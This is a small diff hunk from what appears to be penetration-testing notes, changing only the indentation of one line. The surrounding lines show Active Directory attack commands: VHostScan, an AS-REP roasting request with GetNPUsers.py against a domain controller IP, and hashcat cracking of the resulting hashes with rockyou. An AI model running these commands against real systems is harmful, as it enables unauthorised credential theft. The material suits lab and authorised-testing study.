@@ -132,7 +132,7 @@ VHostScan -t local.domain -w /opt/VHostScan/VHostScan/wordlists/virtual-hostscan
 python3 GetNPUsers.py local.domain/ -dc-ip 10.10.10.175 -request -usersfile = To provide users
 ```
 
-    later use below command to crack the password:
+   later use below command to crack the password:
 ```
 hashcat -m 18200 -a 0 Hash.txt /usr/share/wordlists/rockyou.txt --force
 ```
